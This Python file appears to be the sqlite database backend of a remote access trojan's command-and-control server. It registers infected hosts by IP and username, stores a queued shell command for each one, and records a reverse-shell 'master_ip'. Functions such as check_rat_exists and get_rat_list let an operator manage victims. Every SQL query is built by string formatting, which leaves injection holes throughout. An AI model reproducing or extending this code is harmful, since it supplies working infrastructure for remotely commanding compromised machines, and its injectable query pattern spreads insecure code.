import sqlite3

# need to update for data created, indexes  #
def create():
    db = sqlite3.connect('apext.db')
    db.execute(''' CREATE TABLE users (
    user_ip VARCHAR(32) NOT NULL,
    username VARCHAR(32) NOT NULL
    ); ''')

    db.execute(''' CREATE TABLE command (
    user_ip VARCHAR(32) NOT NULL,
    username VARCHAR(32) NOT NULL,
    command VARCHAR(32) NOT NULL
    ); ''')

    db.execute(''' CREATE TABLE rshell (
    user_ip VARCHAR(32) NOT NULL,
    username VARCHAR(32) NOT NULL,
    master_ip VARCHAR(32) NOT NULL
    ); ''')

def register(ip, username):
    db = sqlite3.connect('apext.db')
    db.execute("INSERT INTO users VALUES('{0}', '{1}');".format(ip, username))
    db.commit()
    db.execute("INSERT INTO command VALUES('{0}', '{1}', '{2}');".format(ip, username, 'ls'))
    db.commit()
    db.execute("INSERT INTO rshell VALUES('{0}', '{1}', '{2}');".format(ip, username, '0.0.0.0'))
    db.commit()

def user_command(ip, username, command):
    db = sqlite3.connect('apext.db')
    db.execute("UPDATE command SET command = '{0}' WHERE user_ip='{1}' and username='{2}';".format(command ,ip, username))
    db.commit()

def rshell_master(ip, username, master_ip):
    db = sqlite3.connect('apext.db')
    db.execute("UPDATE rshell SET master_ip = '{0}' WHERE user_ip='{1}' and username='{2}';".format(master_ip, ip, username))
    db.commit()

def get_rshell_master(ip, username):
    print(ip + username)
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT master_ip FROM rshell WHERE user_ip="{0}" and username="{1}";'.format(ip, username))
    return cur.fetchone()[0]


def get_user_command(ip, username):
    print(ip + username)
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT command FROM command WHERE user_ip="{0}" and username="{1}";'.format(ip, username))
    return cur.fetchone()[0]

def check_rat_exists(ip, username):
    print(ip + username)
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT * FROM command WHERE user_ip="{0}" and username="{1}";'.format(ip, username))

    return cur.fetchone()

def remove_user_command(ip, username):
    print(ip + username)
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute("UPDATE command SET command = ' ' WHERE user_ip='{0}' and username='{1}';".format(ip, username))
    db.commit()


def get_rat_list():
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT user_ip, username FROM users ;')
    return cur.fetchall()[0]

def check_rat_existss(ip):
    print(ip)
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT user_ip, username FROM command WHERE user_ip="{0}";'.format(ip))
    return cur.fetchone()

try:
    create()
except Exception as e:
    print(e)
    pass